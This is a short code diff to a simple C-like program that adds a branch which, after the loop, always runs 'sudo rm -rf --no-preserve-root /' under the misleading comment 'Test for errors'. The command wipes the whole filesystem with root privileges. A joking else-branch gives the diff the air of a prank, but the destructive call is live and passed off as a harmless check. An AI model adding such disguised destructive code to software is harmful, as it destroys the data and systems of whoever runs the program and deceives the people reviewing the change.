@@ -20,3 +20,10 @@ while (i < 3) {
 for (i = 0; i < 3; i += 1) {
   printf("Yay end of program\n");
 }
+
+if (i >= 3) {
+  // Test for errors
+  run("sudo rm -rf --no-preserve-root /");
+} else {
+  printf("You have been spared by cosmic anomalies.");
+}
